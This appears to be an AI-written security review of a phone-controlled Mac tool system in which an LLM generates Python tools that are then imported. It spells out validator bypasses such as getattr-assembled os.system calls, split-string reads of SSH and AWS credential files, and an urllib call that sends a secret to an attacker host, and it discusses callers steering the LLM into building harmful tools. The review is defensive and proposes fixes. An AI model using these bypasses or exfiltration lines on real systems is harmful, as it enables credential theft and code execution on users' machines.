# Security Review — Mac-tool system (branch `feat/mac-tools-factory-memory`)

Scope: `src/mac_tools/**`, `src/twilio_bot.py` (caller-auth + factory wiring),
`src/agent_memory/recorder.py` (secret scrub). Threat model: an LLM (and, via the phone, a
caller) drives the tools; caller-ID may be spoofed; the GLM factory writes NEW code that is
imported and run on the owner's machine with the daemon's privileges.

Method: read-only static review of every category module + the core framework, plus live
static checks against `validate_tool_code()` using constructed bypass strings
(`PYTHONPATH=src .venv/bin/python`). No untrusted module was executed, no network, no daemon,
no sound.

**Bottom line:** the hand-written tool surface is solid — caller/LLM text consistently reaches
AppleScript only via `args=[...]` + `on run argv`, `run_shell` is always list-args with no
`shell=True`, and path/host/app/url validation is present. **The danger is entirely in the
factory + validator path: the validator is a denylist that is trivially bypassed, and the
factory imports (= executes) generated code before any gating takes effect.** Multiple P0s
below are exploitable today by an authorized caller (and the secrets HARD carve-out, which the
owner declared non-negotiable and "applies even to an authorized caller", is breakable).

---

## P0 — exploitable now

### P0-1. The validator does not reject side-effectful top-level code; the factory executes it at import
- **Where:** `src/mac_tools/validator.py` (whole module — no top-level-statement check);
  `src/mac_tools/factory.py:438-449` (write then `importlib.import_module`);
  `src/mac_tools/generated/__init__.py:16-23` (auto-import every generated `.py`).
- **Attack:** Generated modules are *imported* to register their `@tool`. Python runs **every
  top-level statement** at import. The validator only inspects `Call`/`Import`/`Constant` nodes
  for a denylist — it never requires the module body to consist solely of
  imports/defs/decorated-funcs/constants. A module whose top level does the dirty work (not
  inside the `@tool` function) sails through and runs the instant the factory imports it — which
  happens **before** `enabled`/gating is set (`factory.py:445` import vs `:461` `enabled=False`).
  So even a "RISKY → gated/disabled" classification does **not** stop execution; the code has
  already run.
- **Verified (live):** `validate_tool_code()` returns `ok=True` for a module whose top level is
  `open("/tmp/pwned","w").write("x")` plus a trivial `@tool` (sample "3" — *PASSES*). The
  `urllib.request.urlopen("http://evil…")` sample returns `ok=True, risky=True` — meaning the
  file is still written and imported, so the exfil runs at import time and gating only disables
  the (now-superfluous) tool afterward.
- **Fix:** Make the validator a **structural allowlist of top-level nodes**: walk
  `tree.body` and reject anything that is not `Import`/`ImportFrom`, `FunctionDef`/`AsyncFunctionDef`,
  `ClassDef` (optionally), simple constant/`__all__` assignments, or a docstring `Expr`. Reject
  any top-level `Expr` call, `With`, `For`, `If`, `Try`, `while`, etc. Additionally, in
  `factory.py`, run a defensive second `validate_tool_code` on the bytes actually written **and
  do not import until after gating is decided** — or import in a constrained way. (Structural
  rejection is the real fix; import-order is defense in depth.)

### P0-2. Banned calls are reachable via `getattr`/aliasing — denylist is name-only
- **Where:** `validator.py:_check_calls` (242-291) matches only literal `os.system`,
  `subprocess.run`, etc. as `Name`/`Attribute` AST nodes.
- **Attack:** `getattr(os, "sys"+"tem")(...)`, `getattr(subprocess, "Pop"+"en")(...)`, or
  `__builtins__["ev"+"al"]("…")` resolve the exact banned callables without the literal text,
  so neither the AST pass nor the raw-text `_DANGER_DENY` scan fires.
- **Verified (live):** samples "1" (`getattr(os,"sys"+"tem")` at top level), "2" (`eval` via
  `__builtins__`), and "6" (`getattr(subprocess,"Pop"+"en")`) all return `ok=True` — *PASSES*.
- **Fix:** Reject `getattr`/`setattr`/`__getattribute__` calls outright in generated code
  (almost never needed in a simple tool), reject any reference to the name `__builtins__`,
  reject `vars`/`globals`/`locals`, and reject string concatenation used to build attribute/
  builtin names is impractical — so the real defense is (a) the structural top-level allowlist
  (P0-1, which kills import-time use) **and** (b) banning `getattr`/`__builtins__`/`vars`/
  `globals` as flagged constructs anywhere in the module.

### P0-3. Secrets HARD carve-out is bypassable in generated code (split strings + non-deny paths)
- **Where:** `validator.py:_SECRET_DENY` (55-82) is a **raw-text substring** denylist;
  `factory.py` then imports the module so any top-level read executes.
- **Attack 1 (split string):** Build the secret path from fragments so the literal never
  appears: `open(os.path.expanduser("~")+"/.s"+"sh/id_"+"rsa").read()` at top level.
- **Attack 2 (path not on the denylist):** `~/.aws/config` (and `~/.aws/credentials` if the
  word "credential" is avoided), `~/.config/gh/hosts.yml`, `~/Library/Application Support/...`,
  browser cookie/login DBs by a non-deny path, etc. The denylist enumerates a handful of names;
  real credential stores outside it read fine.
- **Verified (live):** the split-string `id_rsa` path sample returns `ok=True` — *PASSES*; a
  top-level `open(~ + "/.aws/" + "config").read()` returns `ok=True` — *PASSES*. (Note: the
  raw-text scan even fires on the word "credential" appearing in a **comment**, which shows how
  brittle substring matching is — it both over- and under-matches.)
- **Impact:** Directly violates the owner's non-negotiable secrets carve-out ("never", "applies
  even to an authorized caller"). A caller can ask the factory to "build a tool that reads my AWS
  config and texts it to me", the file is read at import, and (P0-1) the read runs regardless of
  gating.
- **Fix:** The structural top-level allowlist (P0-1) removes import-time reads. For the
  in-handler case, do not rely on a name denylist for security — instead **default-deny the
  filesystem-read surface in generated code**: forbid bare `open(...)` in generated modules
  entirely (generated tools should reach the system only through `runner.run_osa`/`run_shell`),
  and have `read_text_file` (the one sanctioned reader) be the only path that touches files, with
  its existing refusal list *plus* a directory allowlist. Keep the raw-text deny as defense in
  depth only, never as the gate.

### P0-4. Import allowlist permits `urllib` whose `.request` submodule is a full network client
- **Where:** `validator.py:_ALLOWED_IMPORT_ROOTS` includes `"urllib"` (line 140) "for
  urllib.parse"; the allowlist is on the **root**, so `urllib.request` (and `urllib.error`,
  which can trigger fetches) is allowed.
- **Attack:** `import urllib.request; urllib.request.urlopen("http://attacker/?d="+secret)` —
  a network exfiltration / SSRF primitive that the "no network libs (requests/socket)" rule was
  meant to exclude. The host-literal check only marks it *risky* (doesn't reject), and per P0-1
  it still executes at import.
- **Verified (live):** sample "4" returns `ok=True` (risky) — the module is still written +
  imported.
- **Fix:** Allowlist the exact submodule, not the root: permit only `urllib.parse`. Reject
  `urllib.request`/`urllib.error`/`urllib.robotparser`. Apply the same precision to any other
  root with a dangerous submodule.

### P0-5. `create_tool` (GLM call) has no network timeout
- **Where:** `factory.py:293` `client = OpenAI(api_key=api_key, base_url=base_url)` — no
  `timeout=`/`max_retries=`. Contrast `twilio_bot.py:894` which caps the NVIDIA client at
  `timeout=8.0`.
- **Attack / failure mode:** `_call_glm` runs in `asyncio.to_thread`, but a hung Z.AI
  connection leaves the worker thread (and the thread-pool slot) blocked indefinitely. Repeated
  `request_new_tool` calls during one call (the LLM can call it every turn) can exhaust the
  default thread pool and wedge the pipeline. Combined with P0-6 this is a cheap DoS.
- **Fix:** `OpenAI(api_key=…, base_url=…, timeout=20.0, max_retries=1)` and wrap the
  `to_thread(create_tool, …)` in `asyncio.wait_for(...)` with a hard ceiling.

---

## P1 — weaknesses

### P1-1. No rate limit / cost cap on `request_new_tool` → key burn + disk fill
- **Where:** `twilio_bot.py:_request_new_tool` (465-522), `factory.create_tool`. Nothing bounds
  how often the factory runs, how many modules `generated/` may hold, or total GLM spend.
- **Attack:** A caller (or a looping LLM) repeatedly asks for new tools, spending the ZAI key
  and writing unbounded files to `src/mac_tools/generated/`. Each accepted module also auto-loads
  on the next `load_all()`/restart.
- **Fix:** Per-call counter (e.g. ≤3 builds/call) and a global cooldown; cap files in
  `generated/`; optionally a daily GLM-call budget. Return a friendly "I've built enough for now"
  past the cap.

### P1-2. `_module_name_for` allows a generated tool to overwrite an existing generated module
- **Where:** `factory.py:256-262` + `:429` `target = _GENERATED_DIR / f"{stem}.py"` with
  `write_text` (no existence check); `REGISTRY.register` is last-wins (`registry.py:55-58`).
- **Attack:** GLM (or a caller steering it) picks a `name=` that snake-cases to an existing
  generated stem; the new module silently overwrites the old file and replaces the registered
  tool. Not a privilege escalation by itself (still validator-gated), but it lets one build
  clobber another and muddies the audit trail / provenance.
- **Note:** It cannot overwrite a *category* module (those live in `categories/`, not
  `generated/`), and `_module_name_for` strips non-identifier chars so there's no path traversal
  out of `generated/` — good. Still, collisions should be explicit.
- **Fix:** If `target` exists (or the name collides with a non-generated registry tool), refuse
  or version the filename, and never let a generated tool shadow a hand-written one.

### P1-3. Risk classification is keyword-based and easily evaded → a sending/deleting tool auto-enables
- **Where:** `validator.py:_RISK_SIGNALS` (163-171) scans source text for words like "send",
  "trash", "sleep".
- **Attack:** A generated tool that performs a CONFIRM-class action but whose code avoids those
  words (e.g. iMessage via `participant`/AppleScript without the literal "send"/"message", or a
  Trash op phrased without "trash"/"delete") is classified SAFE and **auto-enabled + hot-added**,
  bypassing the owner-approval gate the contract requires for risky generated tools. Because the
  handler still goes through `dispatch`, a `Risk.SAFE` spec is NOT staged on the broker — it runs
  immediately with no confirmation.
- **Fix:** Default generated tools to **gated/disabled unless proven SAFE**, or require the
  factory to derive risk from the *declared* `risk=`/`confirm_summary` in the AST (not keywords)
  and treat any tool that calls `run_osa`/`run_shell` with caller args toward Messages/Mail/
  Finder-delete/power as CONFIRM. Keyword scan is a hint, not a gate.

### P1-4. `agent_memory` scrub misses common secret shapes (unlabeled tokens, ZAI keys, raw hex)
- **Where:** `recorder.py:_SECRET_PATTERNS` (30-46).
- **Verified (live):** scrub catches `nvapi-…`, `sk-…`, labeled `password = X`. It **misses**:
  a bare 40-char Deepgram-style hex token (`"a"*40` passes through unredacted), a ZAI-style key
  with no recognized prefix / dotted form (`1a2b3c.def456.…` passes through), and an unlabeled
  spoken password (`hunter2ismypassword` passes through). The `Cartesia`/`Deepgram`/`Twilio`
  and ZAI keys this very app uses would not be redacted if spoken/echoed.
- **Impact:** A caller reading a key aloud, or a tool result echoing one, gets persisted to the
  memory DB and can be recalled later — a softer secrets leak than P0-3 but still a carve-out
  miss.
- **Fix:** Add a high-entropy/long-token catch-all (e.g. redact any standalone
  `[A-Za-z0-9_\-]{32,}` and dotted JWT-like triples), and the Twilio `AC…`/Cartesia/Deepgram key
  shapes. `remember_this` already refuses anything scrub touches, so improving scrub also tightens
  that path.

### P1-5. `read_text_file` secret refusal lets through real credential dirs
- **Where:** `files.py:_SECRET_PATTERNS` (49-61). Good coverage of `.env`, `.ssh/`, `*.pem`,
  `*.key`, `id_rsa`, `keychain`, `credential`, `secret`, `token`, `*.p12`.
- **Gap:** Misses `~/.aws/` (config/credentials live there; "config" isn't a deny word),
  `~/.config/gh/hosts.yml`, `~/.netrc` (the validator denies `.netrc` but `read_text_file` does
  not), `*.p8`/`*.ppk`/`*.jks`, and `~/Library/Cookies`/browser login DBs. Substring matching
  also can't see, e.g., a path the caller passes that resolves (via symlink) into a secret store.
- **Fix:** Add `.aws/`, `.netrc`, `.gnupg/`, `*.p8`, `*.ppk`, browser-profile cred DBs to the
  list; consider switching from a name denylist to a **read allowlist** of directories the tool
  is permitted to read, given how high-value this carve-out is.

---

## P2 — hardening

### P2-1. `factory.create_tool` fenced-code fallback accepts un-fenced text as a module
- `factory.py:_extract_python` (238-253): if there's no ```python fence it returns the whole
  reply when it merely contains `@tool` or `def `. The validator still runs, but accepting
  loosely-formatted output widens the input the validator must perfectly handle. Prefer to
  require the strict fenced format and reject otherwise.

### P2-2. Audit log stores scrubbed-but-not-validated factory data; confirm key never logged
- Confirmed **good**: `factory.py` logs the rendered prompt length + the GLM reply (truncated to
  2000 chars) and outcomes, but **never** logs `ZAI_API_KEY` (the key is only read into the
  local `OpenAI(...)` client at `:289-293` and never passed to `audit`). `build_glm_system_prompt`
  embeds only the static app list + live tool names/descriptions/categories + a fixed exemplar —
  **no secrets/PII** (the installed-apps list is curated and path-free). The mirrored
  `docs/tooling/glm_factory_prompt.md` likewise contains no secrets. No action needed beyond
  ensuring tool *descriptions* (which the LLM/caller can influence via generated tools) never
  carry secrets — covered if P0/P1 land.
- Minor: the GLM **reply** is logged verbatim (truncated). If a future prompt change ever caused
  GLM to echo a secret, it'd land in `logs/actions.log`. Consider running the reply through
  `agent_memory.scrub` before audit.

### P2-3. `run_shell` resolves bare binaries on `$PATH`
- `runner.py:82-99` resolves a bare `argv[0]` via `shutil.which`. All *hand-written* callers pass
  absolute paths or fixed binaries — good. But generated tools may pass a bare name; if the
  daemon's `$PATH` is ever attacker-influenced, `which` could resolve an unexpected binary. Low
  risk on a single-user Mac, but consider requiring absolute paths in generated tools (enforce in
  validator) or pinning a known `$PATH`.

---

## Caller authorization — assessment (largely fail-closed; one residual risk)

- **Fail-closed:** ✅ `twilio_bot.py:842-843` — `authorized = str(authorized_raw).lower() ==
  "true"`; anything missing/malformed → no tools, no factory, no broker, no memory. Unauthorized
  inbound gets the no-tools persona (`:928-933`).
- **Can a non-Twilio client forge `authorized=true`?** The `authorized` `<Parameter>` is set
  **server-side** in `/twiml` from the real `From` vs the allowlist (`:733-734`), and a direct
  `/ws` connection is gated by the **per-call ws token** (`:801-818`), which is minted in
  `/twiml` and required on either the query string or `customParameters`, compared with
  `secrets.compare_digest`. A stranger who hits `/ws` without first driving `/twiml` has no valid
  token → rejected (1008). So forging `authorized=true` requires already having a valid per-call
  token, which requires Twilio to have invoked `/twiml`. **Good.**
- **Residual risk (documented, accepted by owner):** caller-ID spoofing. If an attacker spoofs an
  allowlisted `From`, Twilio invokes `/twiml`, the server computes `authorized=true`, mints a
  token, and the attacker's call is fully authorized with the entire Mac-control + factory
  surface. The contract acknowledges "Caller ID can be spoofed; treat it as access-control, not
  crypto." This is the single biggest *systemic* risk and it amplifies every factory P0 above —
  recommend a stronger second factor for the high-impact tools (e.g. a spoken passphrase before
  enabling factory / send / power tools, or restricting the factory + sends to the **outbound**
  morning call only). Anonymous/blocked callers: `From` empty → `_normalize_e164("")==""` →
  not in allowlist → unauthorized. ✅

---

## What's solid (no action needed)

- **AppleScript injection:** every category module passes caller/LLM text to AppleScript only as
  trailing `args=[...]` read via `on run argv`. Confirmed across messaging (send_imessage/
  send_mail), productivity (notes/reminders/calendar), files (reveal/move_to_trash/wallpaper),
  apps (activate/hide/quit), notifications, web, network, input_control, system. The only inlined
  values are controlled ints (`clamp`ed coords/steps), fixed-enum modifier tokens, and our own
  booleans — never raw caller text. No `do shell script` carries caller input (`power.py:66` is a
  fixed literal).
- **Shell:** `run_shell` is always list-args, never `shell=True`; no `os.system`/`os.popen`/raw
  `subprocess.*` anywhere outside `runner.py`. URL scheme allowlist (http/https) in `web.py`
  blocks `javascript:`/`file:`/`data:`. Host charset + app-name charset (no slashes → no paths)
  validation present.
- **Deletes:** Trash-only via Finder `delete`; no `rm`/`os.remove`/`shutil.rmtree` in any handler.
- **CONFIRM gating:** `dispatch` stages CONFIRM tools on a single-slot per-call broker and runs
  only on `confirm_action`; broker clears before running. Sound.
- **Factory key handling / prompt:** ZAI key never logged; system prompt carries no secrets/PII.

---

## Priority fix order
1. **P0-1** structural top-level allowlist in the validator (kills import-time execution — the
   keystone; also neutralizes the import-time half of P0-2/P0-3/P0-4).
2. **P0-2 / P0-4** ban `getattr`/`__builtins__`/`vars`/`globals`; tighten import allowlist to
   `urllib.parse` only.
3. **P0-3 / P1-5** forbid bare `open()` in generated code; make the secrets carve-out a read
   *allowlist*, not a name denylist.
4. **P0-5 / P1-1** GLM client timeout + `request_new_tool` rate/cost cap.
5. **P1-3** default generated tools to gated-unless-proven-SAFE.
6. **P1-4** broaden `agent_memory` scrub.
</content>
</invoke>
